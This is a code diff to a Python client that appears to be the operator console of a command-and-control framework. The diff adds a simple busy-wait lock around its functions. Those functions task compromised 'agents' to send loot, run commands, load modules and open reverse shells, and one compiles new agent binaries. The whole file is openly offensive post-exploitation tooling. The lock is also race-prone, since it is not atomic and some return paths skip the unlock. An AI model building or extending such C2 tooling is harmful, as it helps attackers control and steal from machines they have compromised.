@@ -8,6 +8,7 @@ import sys
 import pty
 import base64 as b64
 import pdb
+import time
 
 
 class AgentStruct():
@@ -30,6 +31,16 @@ class Session():
         self.channel = 0
         self.agents = []
 
+        self.is_working = False
+
+    def lock(self):
+        while self.is_working:
+            time.sleep(0.1)
+
+        self.is_working = True
+
+    def unlock(self):
+        self.is_working = False
 
     def update_addr(self, address):
         self.address = address
@@ -59,6 +70,7 @@ class Session():
 
     def init_connection(self):
         #pdb.set_trace()
+        self.lock()
 
         self.ssh.connect(hostname=self.address, port=self.port, username=self.username, password=self.password, allow_agent=False)
 
@@ -97,6 +109,7 @@ class Session():
                     break
         
         print("[+] Successfully gathered agent information")
+        self.unlock()
 
     @staticmethod
     def init_channel(address, port, user, passwd):
@@ -118,6 +131,7 @@ class Session():
 
 
     def update(self):
+        self.lock()
         quitting = False
         tmp = self.agents
         self.agents = []
@@ -144,9 +158,11 @@ class Session():
                     break
         
         print("[+] Successfully gathered agent information")
+        self.unlock()
         return 0
 
     def download_loot(self, agent_id):
+        self.lock()
         filepath = "."#misc.getSavePath()
         cnt=0
         data = b""
@@ -198,9 +214,11 @@ class Session():
                 print("[+] Got finished notification")
                 break  
         print("Complete")
+        self.unlock()
         return 0
 
     def upload_file(self, agent_id, file):
+        self.lock()
         print("[ ] Doing upload")
         self.channel.sendall("23|" + agent_id + ":" + file.filename)
         self.channel.recv(3)
@@ -215,16 +233,20 @@ class Session():
         self.channel.send(buff)
         ret = self.channel.recv(3)
         print("[+] Success")
+        self.unlock()
         return 0
 
     def do_download(self, agent_id, path):
+        self.lock()
         print("[ ] Doing Download...")
         self.channel.sendall("24|%s:%s" % (agent_id, path))
         self.channel.recv(2)
         print("[+] Tasked agent with download")
+        self.unlock()
         return 0
 
     def push_module(self, agent_id, filestruct):
+        self.lock()
         print("[ ] Pushing module file to agent %s..." % agent_id)
         self.channel.sendall("25|%s" % agent_id)
         self.channel.recv(3)
@@ -238,16 +260,21 @@ class Session():
         self.channel.send(buff)
         ret = self.channel.recv(3)
         print("[+] Success")
+        self.unlock()
         return 0
 
     def send_command(self, agent_id, command):
+        self.lock()
         print("[ ] Sending command to agent...")
         self.channel.sendall("26|%s:%s" % (agent_id, command))
+        self.unlock()
         return 0
 
     def req_revsh(self, agent_id, port):
+        self.lock()
         print("[ ] Sending Reverse Shell Request...")
         self.channel.sendall("27|%s:%s" % (agent_id, port))
+        self.unlock()
 
     def do_revsh(self, agent_id, port):
         # for the time being, we just gonna
@@ -257,6 +284,7 @@ class Session():
         os.system(comm)
 
     def compile_agent(self, ip, port):
+        self.lock()
         print("[ ] Sending compile request to server (%s:%d)..." % (ip, port))
         self.channel.sendall("28|%s:%s" % (ip, port))
         fileData = b""
@@ -270,14 +298,18 @@ class Session():
         print(len(fileData))
         file = b64.decodebytes(fileData[:size])
         misc.save_file(file)
+        self.unlock()
         return 0
 
     def register_agent(self, name, password):
+        self.lock()
         print("[ ] Registering agent with server...")
         self.channel.sendall('29|%s:%s' % (name, password))
+        self.unlock()
         return 0
 
     def get_transports(self):
+        self.lock()
         print("[ ] Getting available backends from server...")
         self.channel.sendall('32|')
         datsz = int(self.clean(self.channel.recv(128))[0].decode(errors="replace"))
@@ -298,10 +330,10 @@ class Session():
                     dat = entry.split(":")
                     print(entry)
                     ret.append(misc.Transport(dat[0], int(dat[1])))
+        self.unlock()
         return ret
 
     def clean(self, data):
-        print("inside the cleaning func :)")
         data = data.split(b"\x00")
         ret = []
         
@@ -321,11 +353,14 @@ class Session():
         return ret    
         
     def start_transport(self, transport_id, port):
+        self.lock()
         print("[ ] Starting backend with ID %d" % transport_id)
         self.channel.sendall("33|%d:%d" % (transport_id, port))
+        self.unlock()
         return 0
 
     def clean_exit(self):
+        self.lock()
         if self.channel != 0:
             self.channel.sendall("00")
             self.channel = 0
